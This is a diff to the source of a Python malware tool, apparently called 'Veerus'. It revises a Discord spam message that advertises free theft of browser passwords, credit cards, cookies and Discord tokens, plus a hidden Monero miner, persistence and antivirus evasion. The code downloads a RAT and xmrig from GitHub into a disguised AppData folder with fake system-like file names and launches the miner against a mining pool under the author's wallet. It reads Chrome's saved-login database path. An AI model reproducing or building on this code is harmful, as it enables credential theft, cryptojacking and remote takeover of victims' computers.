@@ -57,7 +57,26 @@ WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 dm_all = True
-DMALLMSG = """Hey ! i am a French developer and i created the 1st free discord image grabber, would you be interessed to test it ? link : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
+DMALLMSG = """:flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same?
+Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
+	Discord :
+		Token
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+	Price : 0.00$ ! yes ! Totally Free !
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus"""
 mdmbot = discord.Client()
 STATSWEBHOOK = "NoWebhook667EKIP"
 STATSAPI = [
@@ -88,19 +107,19 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = 6
+PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
-CUDA = False
+CUDA = True
 
 
 computer = wmi.WMI()
 RATURL = "https://github.com/0xSxZ/Veerus/releases/download/dont/r4t.exe"
 MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
-rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
-XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
+rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
+XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -699,6 +718,7 @@ if yes == "yes":
 			for file in files:
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
+		XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
 		print("[.] Starting miner if enabled.")
 		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --threads=4 --background')
 	def MineThreadLinux():
@@ -732,19 +752,12 @@ if yes == "yes":
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
 				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
-				if CUDA == True:
-					XMRIGPATH = XMRIGPATH
-					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true")
-					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'wb+') as f:
-						f.write(r.content)
-					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
-						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
-				else:
-					XMRIGPATH = XMRIGPATH
-					r = requests.get(MINERURL)
-					with open(XMRIGPATH, 'wb') as f:
-						print("Writing..")
-						f.write(r.content)
+				XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
+				rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
+				r = requests.get(MINERURL)
+				with open(XMRIGPATH, 'wb') as f:
+					print("Writing..")
+					f.write(r.content)
 				r = requests.get(RATURL)
 				with open(rat_path, 'wb') as f:
 					print("Writing..")
@@ -752,9 +765,9 @@ if yes == "yes":
 					threading.Thread(target=rat_thread).start()
 			except Exception as e:
 				print(e)
-			if MINE == True and checkIfProcessRunning("xmrig") == False:
-				threading.Thread(target=MineThreadWin).start()
-				print("[.] Executing miner..")
+		if MINE == True and checkIfProcessRunning("xmrig") == False:
+			threading.Thread(target=MineThreadWin).start()
+			print("[.] Executing miner..")
 	def json_extract(obj, key):
 		"""Recursively fetch values from nested JSON."""
 		arr = []
